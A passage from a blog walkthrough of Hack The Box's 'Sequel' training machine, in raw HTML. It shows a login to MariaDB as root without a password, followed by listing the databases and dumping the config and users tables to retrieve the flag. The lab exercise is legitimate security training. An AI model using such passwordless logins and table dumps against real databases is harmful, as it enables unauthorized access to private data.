</span></span><span class=line><span class=cl>└──╼ <span class=nv>$mysql</span> -h <span class=nv>$rhost</span> -u root
</span></span><span class=line><span class=cl>Welcome to the MariaDB monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
</span></span><span class=line><span class=cl>Your MariaDB connection id is <span class=m>147</span>
</span></span><span class=line><span class=cl>Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span class=m>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; 
</span></span></code></pre></div><blockquote><p>root</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</em></p><p><strong>Reading up</strong> a bit on <strong>sql</strong> should provide you with the desired answer.</p><blockquote><p>*</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>In SQL, what symbol do we need to end each query with?</em></p><p>It is literally displayed by the <em><strong>MariaDB</strong></em> <strong>welcome message</strong>.</p><blockquote><p>;</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that&rsquo;s unique to this host?</em></p><p>Use the <em><strong>show</strong></em> command to <strong>list</strong> out all the available <strong>databases</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> htb                <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=m>4</span> rows in <span class=nb>set</span> <span class=o>(</span>0.014 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; 
</span></span></code></pre></div><p>From these, the only one that <strong>particularly</strong> stands out is the <em>htb</em> <strong>database</strong>.</p><blockquote><p>htb</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Try and <strong>dump</strong> the contents of the <em>htb</em> <strong>database</strong>. One way to do this is to first select the <em>htb</em> <strong>database</strong> and then list all it&rsquo;s <strong>tables</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>MariaDB <span class=o>[(</span>none<span class=o>)]</span>&gt; use htb
</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database changed
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>htb<span class=o>]</span>&gt; show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_htb <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl><span class=p>|</span> config        <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> users         <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------+
</span></span><span class=line><span class=cl><span class=m>2</span> rows in <span class=nb>set</span> <span class=o>(</span>0.011 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>htb<span class=o>]</span>&gt;
</span></span></code></pre></div><p><strong>Dump</strong> all the data in the <strong>tables</strong>. Use the <strong>information</strong> <strong>obtained</strong> in the previous tasks to solve this.</p><table><thead><tr><th>useful information</th><th style=text-align:left>task</th></tr></thead><tbody><tr><td>usage of *</td><td style=text-align:left>TASK5</td></tr><tr><td>usage of ;</td><td style=text-align:left>TASK6</td></tr><tr><td>targeted <strong>database</strong></td><td style=text-align:left>TASK7</td></tr></tbody></table><p>The only <strong>missing</strong> piece of <strong>information</strong> is the <em><strong>select</strong></em> command which we can easily <em>look up</em> online.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>MariaDB <span class=o>[</span>htb<span class=o>]</span>&gt; <span class=k>select</span> * from config<span class=p>;</span>
</span></span><span class=line><span class=cl>+----+-----------------------+----------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> name                  <span class=p>|</span> value                            <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+-----------------------+----------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>1</span> <span class=p>|</span> timeout               <span class=p>|</span> 60s                              <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>2</span> <span class=p>|</span> security              <span class=p>|</span> default                          <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>3</span> <span class=p>|</span> auto_logon            <span class=p>|</span> <span class=nb>false</span>                            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>4</span> <span class=p>|</span> max_size              <span class=p>|</span> 2M                               <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>5</span> <span class=p>|</span> flag                  <span class=p>|</span> &lt;flag&gt;                           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>6</span> <span class=p>|</span> enable_uploads        <span class=p>|</span> <span class=nb>false</span>                            <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>7</span> <span class=p>|</span> authentication_method <span class=p>|</span> radius                           <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+-----------------------+----------------------------------+
</span></span><span class=line><span class=cl><span class=m>7</span> rows in <span class=nb>set</span> <span class=o>(</span>0.012 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>htb<span class=o>]</span>&gt; <span class=k>select</span> * from users<span class=p>;</span> 
</span></span><span class=line><span class=cl>+----+----------+------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> username <span class=p>|</span> email            <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+----------+------------------+
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>1</span> <span class=p>|</span> admin    <span class=p>|</span> admin@sequel.htb <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>2</span> <span class=p>|</span> lara     <span class=p>|</span> lara@sequel.htb  <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>3</span> <span class=p>|</span> sam      <span class=p>|</span> sam@sequel.htb   <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>4</span> <span class=p>|</span> mary     <span class=p>|</span> mary@sequel.htb  <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+----------+------------------+
</span></span><span class=line><span class=cl><span class=m>4</span> rows in <span class=nb>set</span> <span class=o>(</span>0.012 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>MariaDB <span class=o>[</span>htb<span class=o>]</span>&gt;
</span></span></code></pre></div><p>The <strong>flag</strong> is in the <em>config</em> <strong>table</strong>.</p><blockquote><p>flag</p></blockquote><p>Make sure to <strong>terminate</strong> the <strong>target</strong> box <strong>before</strong> you <strong>continue</strong> with the next machine!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/sequel/>sequel</a></li><li><a href=https://bluewalle.github.io/tags/tier-1/>tier-1</a></li><li><a href=https://bluewalle.github.io/tags/free-tier/>free-tier</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/databases/>databases</a></li><li><a href=https://bluewalle.github.io/tags/mysql/>mysql</a></li><li><a href=https://bluewalle.github.io/tags/sql/>sql</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/weak-credentials/>weak-credentials</a></li><li><a href=https://bluewalle.github.io/tags/linux-target/>linux-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>